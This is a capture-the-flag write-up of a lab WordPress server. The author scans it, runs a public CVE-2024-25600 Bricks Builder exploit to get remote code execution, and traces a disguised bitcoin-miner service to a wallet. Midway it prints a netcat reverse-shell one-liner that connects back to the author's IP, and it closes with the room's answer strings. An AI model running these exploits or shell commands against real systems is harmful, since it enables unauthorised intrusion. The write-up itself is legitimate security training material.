## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key.
From Three Million Bricks to Three Million Transactions!  
Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.  
Can you hack back the server and identify what happened there?
**Note:** Add `10.201.89.175 bricks.thm` to your **/etc/hosts** file.
```

## IP-Address
```IP-Address
10.201.89.175
```

## RustScan
```bash
$ rustscan -a 10.201.89.175 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 60
80/tcp   open  http    syn-ack ttl 60
443/tcp  open  https   syn-ack ttl 60
3306/tcp open  mysql   syn-ack ttl 60
```

## FFUF
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://bricks.thm -k -mc 200,401,403
```
but didnt found anything so we used 
## WPScan
```bash
$ wpscan --url https://bricks.thm/                     
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


Scan Aborted: The url supplied 'https://bricks.thm/' seems to be down (SSL peer certificate or SSH remote key was not OK)

```

Then try with --disable-ssl-certificate
```bash
$ wpscan --url https://bricks.thm/ --disable-tls-checks

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.201.89.175]
[+] Started: Tue Aug  5 22:37:51 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:11 <=================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Aug  5 22:38:32 2025
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.615 KB
[+] Data Received: 110.502 KB
[+] Memory used: 266.633 MB
[+] Elapsed time: 00:00:41

```

## Analyze
```bash
[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
```

Version = 1.9.5

After that we discovered some exploit on different different platform and after more exploring we found
```github
https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress/tree/main
```
After this I clone the repo and exploit with requirements 
```requirements
alive_progress
bs4
prompt_toolkit
requests
rich
```
Then we create an separate space using venu
```bash
python3 -m venv venv
source venv/bin/activate
pip install -r req.txt
─$ python3 exploit.py -u https://bricks.thm    
```

After this Execution we got the reverse shell
```bash
# whoami
apache 

# ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php 
```

Got the Hidden File.txt `650c844110baced87e1606453b93f22a.txt`

## Got the Flag
```flag
# cat 650c844110baced87e1606453b93f22a.txt
[flag omitted] 
```

then After trying to change directory I am Unable to Do So we did a reverse shell
using https://revshells.com
```bash
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.36.74 4444 >/tmp/f
```
Got the Reverse shell, then we start looking for suspicious services
```bash
$ systemctl | grep running
  proc-sys-fs-binfmt_misc.automount                loaded active     running         Arbitrary Executable File Formats File System Automount Point                
  acpid.path                                       loaded active     running         ACPI Events Check                                                            
  init.scope                                       loaded active     running         System and Service Manager                                                   
  session-c1.scope                                 loaded active     running         Session c1 of user lightdm                                                   
  accounts-daemon.service                          loaded active     running         Accounts Service                                                             
  acpid.service                                    loaded active     running         ACPI event daemon                                                            
  atd.service                                      loaded active     running         Deferred execution scheduler                                                 
  avahi-daemon.service                             loaded active     running         Avahi mDNS/DNS-SD Stack                                                      
  cron.service                                     loaded active     running         Regular background program processing daemon                                 
  cups-browsed.service                             loaded active     running         Make remote CUPS printers available locally                                  
  cups.service                                     loaded active     running         CUPS Scheduler                                                               
  dbus.service                                     loaded active     running         D-Bus System Message Bus                                                     
  getty@tty1.service                               loaded active     running         Getty on tty1                                                                
  httpd.service                                    loaded active     running         LSB: starts Apache Web Server                                                
  irqbalance.service                               loaded active     running         irqbalance daemon                                                            
  kerneloops.service                               loaded active     running         Tool to automatically collect and submit kernel crash signatures             
  lightdm.service                                  loaded active     running         Light Display Manager                                                        
  ModemManager.service                             loaded active     running         Modem Manager                                                                
  multipathd.service                               loaded active     running         Device-Mapper Multipath Device Controller                                    
  mysqld.service                                   loaded active     running         LSB: start and stop MySQL                                                    
  networkd-dispatcher.service                      loaded active     running         Dispatcher daemon for systemd-networkd                                       
  NetworkManager.service                           loaded active     running         Network Manager                                                              
  polkit.service                                   loaded active     running         Authorization Manager                                                        
  rsyslog.service                                  loaded active     running         System Logging Service                                                       
  rtkit-daemon.service                             loaded active     running         RealtimeKit Scheduling Policy Service                                        
  serial-getty@ttyS0.service                       loaded active     running         Serial Getty on ttyS0                                                        
  snap.amazon-ssm-agent.amazon-ssm-agent.service   loaded active     running         Service for snap application amazon-ssm-agent.amazon-ssm-agent               
  snapd.service                                    loaded active     running         Snap Daemon                                                                  
  ssh.service                                      loaded active     running         OpenBSD Secure Shell server                                                  
  switcheroo-control.service                       loaded active     running         Switcheroo Control Proxy service                                             
  systemd-journald.service                         loaded active     running         Journal Service                                                              
  systemd-logind.service                           loaded active     running         Login Service                                                                
  systemd-networkd.service                         loaded active     running         Network Service                                                              
  systemd-resolved.service                         loaded active     running         Network Name Resolution                                                      
  systemd-timesyncd.service                        loaded active     running         Network Time Synchronization                                                 
  systemd-udevd.service                            loaded active     running         udev Kernel Device Manager                                                   
  ubuntu.service                                   loaded active     running         TRYHACK3M                                                                    
  udisks2.service                                  loaded active     running         Disk Manager                                                                 
  unattended-upgrades.service                      loaded active     running         Unattended Upgrades Shutdown                                                 
  upower.service                                   loaded active     running         Daemon for power management                                                  
  user@1000.service                                loaded active     running         User Manager for UID 1000                                                    
  user@114.service                                 loaded active     running         User Manager for UID 114                                                     
  whoopsie.service                                 loaded active     running         crash report submission daemon                                               
  wpa_supplicant.service                           loaded active     running         WPA supplicant                                                               
  acpid.socket                                     loaded active     running         ACPID Listen Socket                                                          
  avahi-daemon.socket                              loaded active     running         Avahi mDNS/DNS-SD Stack Activation Socket                                    
  cups.socket                                      loaded active     running         CUPS Scheduler                                                               
  dbus.socket                                      loaded active     running         D-Bus System Message Bus Socket                                              
  multipathd.socket                                loaded active     running         multipathd control socket                                                    
  snapd.socket                                     loaded active     running         Socket activation for snappy daemon                                          
  syslog.socket                                    loaded active     running         Syslog Socket                                                                
  systemd-journald-audit.socket                    loaded active     running         Journal Audit Socket                                                         
  systemd-journald-dev-log.socket                  loaded active     running         Journal Socket (/dev/log)                                                    
  systemd-journald.socket                          loaded active     running         Journal Socket                                                               
  systemd-networkd.socket                          loaded active     running         Network Service Netlink Socket                                               
  systemd-udevd-control.socket                     loaded active     running         udev Control Socket                                                          
  systemd-udevd-kernel.socket                      loaded active     running         udev Kernel Socket  
```

then we found 1 services which are 
1.   ubuntu.service 

```bash
$  systemctl status ubuntu.service
● ubuntu.service - TRYHACK3M
     Loaded: loaded (/etc/systemd/system/ubuntu.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2025-08-06 03:29:07 UTC; 3min 36s ago
   Main PID: 2519 (nm-inet-dialog)
      Tasks: 2 (limit: 4671)
     Memory: 30.6M
     CGroup: /system.slice/ubuntu.service
	             ├─2519 /lib/NetworkManager/nm-inet-dialog
             └─2520 /lib/NetworkManager/nm-inet-dialog
```

And then look for the service files 
```bash
$ ls -la
total 8636
drwxr-xr-x   6 root root    4096 Apr  8  2024 .
drwxr-xr-x 148 root root   12288 Apr  2  2024 ..
drwxr-xr-x   2 root root    4096 Feb 27  2022 VPN
drwxr-xr-x   2 root root    4096 Apr  3  2024 conf.d
drwxr-xr-x   5 root root    4096 Feb 27  2022 dispatcher.d
-rw-r--r--   1 root root   48190 Apr 11  2024 inet.conf
-rwxr-xr-x   1 root root   14712 Feb 16  2024 nm-dhcp-helper
-rwxr-xr-x   1 root root   47672 Feb 16  2024 nm-dispatcher
-rwxr-xr-x   1 root root  843048 Feb 16  2024 nm-iface-helper
-rwxr-xr-x   1 root root 6948448 Apr  8  2024 nm-inet-dialog
-rwxr-xr-x   1 root root  658736 Feb 16  2024 nm-initrd-generator
-rwxr-xr-x   1 root root   27024 Mar 11  2020 nm-openvpn-auth-dialog
-rwxr-xr-x   1 root root   59784 Mar 11  2020 nm-openvpn-service
-rwxr-xr-x   1 root root   31032 Mar 11  2020 nm-openvpn-service-openvpn-helper
-rwxr-xr-x   1 root root   51416 Nov 27  2018 nm-pptp-auth-dialog
-rwxr-xr-x   1 root root   59544 Nov 27  2018 nm-pptp-service
drwxr-xr-x   2 root root    4096 Nov 27  2021 system-connections
```

In which there is 1 files which attract my attention one is 
1. inet.conf   //which stores network binary info 
Content of inet.conf
```bash
$ head -n 5 inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
```
Got the Miner ID 
```base64
5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```
And Decode
```plain
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```
**Validate the wallet address**
Check the length and format:
- `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`  
    ✅ Valid **Bech32** (SegWit) Bitcoin wallet address.
And when we searched this hash on net we found 

```
bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r
https://www.blockchain.com/explorer/addresses/BTC/bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r

To
bc1qu2ds4h6e9pxjvq7m63sjp02h8gxsmwrvztg5xn
https://www.blockchain.com/explorer/addresses/BTC/bc1qu2ds4h6e9pxjvq7m63sjp02h8gxsmwrvztg5xn

https://www.blockchain.com/explorer/transactions/BTC/77312677bde4483b1ca18b363bcba8929cfb34147cf9bbbae1f29cf944275da1

bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
https://www.blockchain.com/explorer/addresses/BTC/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa

```

These 2 websites are used to Identify the bitcoin transaction and wallet verification
```bash
- https://www.blockchain.com/explorer
- https://blockchair.com
```
and got to know that 
The wallet address used has been involved in transactions between wallets belonging to which threat group?
is 
```Flag
LockBit
```

## All Flags
```Flags
# cat 650c844110baced87e1606453b93f22a.txt
[flag omitted] 
nm-inet-dialog
ubuntu.service
inet.conf
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
LockBit
```